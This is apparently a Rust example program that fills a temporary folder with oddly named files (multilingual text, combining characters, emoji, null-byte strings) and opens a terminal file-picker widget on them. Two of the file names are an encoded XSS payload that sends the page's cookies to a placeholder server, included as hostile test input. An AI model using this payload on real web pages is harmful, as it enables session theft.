use lightningcss::stylesheet::{
    ParserOptions,
    StyleSheet,
};
use tui::component::{
    Div,
    FilePicker,
};
use tui::{
    ControlFlow,
    DisplayMode,
    EventLoop,
    InputMethod,
};

fn main() {
    let abuse = [
        r#"0"#,
        r#"<img src  onerror=eval(atob("ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp"))>"#,
        r#"<img src onerror=eval(atob("ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp"))>"#,
        r#"A & B"#,
        r#"Pijamalı"#,
        r#"\0x00\0x00"#,
        r#"\x00\x00"#,
        r#"abc.mjs"#,
        r#"až"#,
        r#"aą̷̨̧͔͚͇̮̟̙͈͖̆̂̉͑͑̋̎̀́͘͝͠b̸͉͔̬͉̿̓̿̒̋͊c̵̛̩̩͚̘͙̮̘̖̻̩̲̀̒͆͋͆͐̈́̈́͒ͅ"#,
        r#"tükörfúrógép"#,
        r#"б"#,
        r#"�"#,
        r#"👪"#,
        r#"∮ E⋅da = Q,  n → ∞, ∑ f(i) = ∏ g(i), ∀x∈ℝ: ⌈x⌉ = −⌊−x⌋, α ∧ ¬β = ¬(¬α ∨ β)"#,
        r#"łódź"#,
        r#"הֽ͏ַ"#,
        r#"羅馬尼亞"#,
        r#"👩‍👩‍👦"#,
        r#"იაროთ რეგისტ"#,
        r#"イロハニホヘト"#,
        r#"французских"#,
        r#"いろはにほへとちりぬるを"#,
        r#"จงฝ่าฟันพัฒนาวิ"#,
        r#"อภัยเหมือนกีฬาอัชฌาสัย"#,
        r#"ą̷̨̧͔͚͇̮̟̙͈͖̆̂̉͑͑̋̎̀́͘͝͠b̸͉͔̬͉̿̓̿̒̋͊c̵̛̩̩͚̘͙̮̘̖̻̩̲̀̒͆͋͆͐̈́̈́͒ͅ"#,
    ];

    let tempdir = tempfile::tempdir().unwrap();

    // Create a file for each
    for name in abuse {
        let file = tempdir.path().join(name);
        println!("making {}", file.display());
        std::fs::write(file, "").unwrap();
    }

    EventLoop::new(
        Div::new().push(
            FilePicker::new(true, vec![])
                .with_id("picker")
                .with_path(tempdir.path().to_str().unwrap().to_owned()),
        ),
        DisplayMode::Inline,
        InputMethod::default(),
        StyleSheet::parse(include_str!("form.css"), ParserOptions::default()).unwrap(),
        ControlFlow::Wait,
    )
    .run(|event, _component, control_flow| match event {
        tui::Event::Quit | tui::Event::Terminate => *control_flow = ControlFlow::Quit,
        _ => (),
    })
    .unwrap();
}
